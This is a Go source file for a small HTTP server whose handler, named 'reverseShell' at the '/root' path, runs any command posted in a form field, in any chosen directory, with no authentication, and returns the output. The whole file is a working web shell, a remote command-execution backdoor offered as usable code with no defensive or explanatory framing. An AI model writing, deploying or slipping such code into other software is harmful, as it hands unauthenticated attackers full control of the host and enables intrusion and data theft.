package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func main() {

	http.HandleFunc("/root", reverseShell)
	err := http.ListenAndServe(":3000", nil)

	if errors.Is(err, http.ErrServerClosed) {
		fmt.Println("server closed")
	} else if err != nil {
		fmt.Printf("error starting server : %s\n", err)
		os.Exit(-1)
	}

}

func reverseShell(w http.ResponseWriter, r *http.Request) {

	command := strings.Trim(r.PostFormValue("command"), " ")
	dir := strings.Trim(r.PostFormValue("dir"), " ")
	if dir == "" {
		dir = "/"
	}
	if command == "" {
		w.WriteHeader(401)
		io.WriteString(w, "error")
		return
	}
	fmt.Println("command:" + command)
	split := strings.Split(command, " ")
	left := split[0]
	right := split[1:]
	args := make([]string, len(right))
	copy(args, right)

	fmt.Println("left:" + left)
	fmt.Print("right:")
	fmt.Println(right)
	fmt.Println(args)

	cmd := exec.Command(left, args...)
	cmd.Dir = dir
	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	out, err2 := cmd.Output()
	if err2 != nil {
		w.WriteHeader(401)
		io.WriteString(w, stderr.String())
		return
	}
	w.WriteHeader(200)
	io.WriteString(w, string(out))
}
